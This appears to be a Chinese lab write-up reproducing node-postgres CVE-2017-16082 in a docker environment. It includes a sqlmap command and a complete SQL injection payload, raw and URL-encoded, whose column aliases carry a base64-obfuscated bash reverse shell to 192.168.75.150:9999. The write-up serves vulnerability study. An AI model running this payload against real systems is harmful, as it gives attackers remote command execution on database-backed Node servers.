# node-postgres 代码执行漏洞（CVE-2017-16082） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16281838.html`](https://www.cnblogs.com/NoCirc1e/p/16281838.html)

## 漏洞原理

node-postgres 在处理类型为`Row Description`的 postgres 返回包时，将字段名拼接到代码中。由于没有进行合理转义，导致一个特殊构造的字段名可逃逸出代码单引号限制，造成代码执行漏洞。

参考链接：

*   [`www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html`](https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)
*   [`node-postgres.com/announcements#2017-08-12-code-execution-vulnerability`](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)
*   [`zhuanlan.zhihu.com/p/28575189`](https://zhuanlan.zhihu.com/p/28575189)

## 漏洞复现

编译及运行环境：

```
docker-compose build
docker-compose up -d
```

![](img/dd6d13ddcd999feaa3e89ef3e046c8e1.png) ![](img/24343b0e626afca4cd13661391db0f1d.png)

成功运行后，访问`http://your-ip:3000/?id=1`即可查看到 id 为 1 的用户信息，用 sqlmap 即可发现此处存在注入点，且数据库为 postgres：

```
sqlmap -u http://192.168.75.130:3000/?id=1 --batch 
```

![](img/f96c059c443f4bdb65013a2ea4eeb99e.png) ![](img/cb4909d39234adadd41eabe40ffc99b5.png) ![](img/681ad6f4d732bed91323263086f18b09.png)

那么，我们就可以猜测这里存在 node-postgres 的代码执行漏洞。编写我想执行的命令`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=|base64 -d|bash`，然后适当分割（每段长度不超过 64 字符）后替换在如下 payload 中：

![](img/1529a43ac69f63da5be4ffdaa951e07d.png)

```
SELECT 1 AS "\']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*", 4 AS "*/`cC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=|base64 -d|bash`)//"
```

将上述 payload 编码后发送：

```
SELECT%201%20AS%20%22%5C'%5D%3D0%3Brequire%3Dprocess.mainModule.constructor._load%3B%2F*%22%2C%202%20AS%20%22*%2Fp%3Drequire(%60child_process%60)%3B%2F*%22%2C%203%20AS%20%22*%2Fp.exec(%60echo%20YmFzaCAtaSA%2BJiAvZGV2L3Rj%60%2B%2F*%22%2C%204%20AS%20%22*%2F%60cC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA%2BJjE%3D%7Cbase64%20-d%7Cbash%60)%2F%2F%22
```

![](img/fd684b1331936399a4ad9e842a1e510b.png)

反弹 shell 成功

![](img/1f61667d3cec1dd6f6cbb4648f9d5f08.png)

因为复现过程中坑比较多，payload 生成与测试过程中如果出现错误，还请多多阅读[我的这篇文章](https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)，从原理上找到问题所在。